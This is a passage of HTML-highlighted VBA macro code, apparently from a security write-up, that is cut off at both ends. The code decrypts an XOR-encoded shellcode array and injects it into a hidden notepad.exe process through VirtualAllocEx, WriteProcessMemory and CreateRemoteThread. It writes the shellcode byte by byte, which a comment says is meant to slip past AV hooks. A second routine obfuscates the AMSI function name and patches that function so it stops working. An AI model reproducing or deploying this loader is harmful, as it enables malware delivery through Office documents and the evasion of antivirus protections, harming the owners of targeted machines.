punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">50</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">90</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">120</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">50</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">103</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">184</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">248</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">39</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">153</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">180</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">179</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">128</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">102</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">28</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">24</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">14</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">97</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">112</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">120</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">102</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">11</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">14</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">106</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">31</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">119</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">86</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">158</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">229</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">47</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">14</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">20</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">94</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">53</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">7</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">158</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">229</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> _</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">38</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">56</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">158</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">60</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">92</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">105</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">228</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">64</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">135</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">153</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">158</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">217</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">227</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">153</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">158</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">207</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">121</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">165</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">72</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">246</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">13</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">167</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">162</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">139</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">152</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">123</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">75</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">58</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">192</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">244</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">141</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">229</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">153</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">180</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">12</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">126</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">26</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">107</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">176</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">131</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">134</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">20</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">53</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">195</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">33</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">114</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">66</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">23</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">12</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">97</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">99</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">135</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">179</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim scSize As </span><span class="token class-name">Long</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    scSize </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">UBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sc</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Decrypt shellcode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token return-type class-name">Dim</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">keyArrayTemp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As </span><span class="token class-name">Byte</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    keyArrayTemp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">key</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">For</span><span class="token plain"> x </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token return-type class-name">To</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">UBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sc</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">sc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token return-type class-name">Xor</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">keyArrayTemp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> Mod </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">key</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Next x</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; TODO </span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> the </span><span class="token return-type class-name">SIZE</span><span class="token plain"> here </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">use a size </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> to the </span><span class="token class-name">shellcode</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token return-type class-name">Dim</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">buf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">685</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Byte</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">For</span><span class="token plain"> y </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token return-type class-name">To</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">UBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sc</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">buf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">y</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">y</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Next y</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27;grab handle </span><span class="token class-name">to</span><span class="token plain"> target</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> which has to be running </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">this</span><span class="token plain"> macro </span><span class="token keyword" style="color:#00009f">is</span><span class="token plain"> </span><span class="token class-name">opened</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> word</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Shell </span><span class="token string" style="color:#e3116c">&quot;notepad.exe&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">vbHide</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    pid </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">getPID</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;notepad.exe&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Handle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">OpenProcess</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">H1F0FFF</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> False</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> pid</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27;MEM_COMMIT </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> MEM_RESERVE</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">PAGE_EXECUTE_READWRITE</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAllocEx</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Handle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">UBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">H3000</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">H40</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27;</span><span class="token keyword" style="color:#00009f">byte</span><span class="token operator" style="color:#393A34">-</span><span class="token keyword" style="color:#00009f">by</span><span class="token operator" style="color:#393A34">-</span><span class="token keyword" style="color:#00009f">byte</span><span class="token plain"> to attempt sneaking our shellcode past AV hooks</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">For</span><span class="token plain"> counter </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">LBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token return-type class-name">To</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">UBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        binData </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">buf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">counter</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Address </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> addr </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token class-name">counter</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        res </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">WriteProcessMemory</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Handle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> Address</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> binData</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Next </span><span class="token class-name">counter</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    thread </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateRemoteThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Handle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">patch</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">StrFile </span><span class="token class-name">As</span><span class="token plain"> String</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> Is64 </span><span class="token class-name">As</span><span class="token plain"> Boolean</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim lib As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim Func_addr As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim temp As </span><span class="token class-name">LongPtr</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lib </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">getmod</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">StrFile</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Func_addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">GetPrAddr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">lib</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Am&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">115</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">105</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;U&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">97</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;c&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Init&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">105</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">97</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;lize&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token class-name">off</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    temp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtPro</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">ByVal</span><span class="token plain"> Func_addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">64</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token return-type class-name">patched</span><span class="token plain"> ByVal </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Func_addr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;&amp;H&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;90&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token return-type class-name">patched</span><span class="token plain"> ByVal </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Func_addr </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;&amp;H&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;C3&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    temp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> VirtPro</span><span class="token class-name punctuation" style="color:#393A34">(</span><span class="token class-name">ByVal Func_addr</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> 32</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> old</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> 0</span><span class="token class-name punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Func_addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">GetPrAddr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">lib</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Am&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">115</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">105</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;U&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">97</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;c&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Init&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" 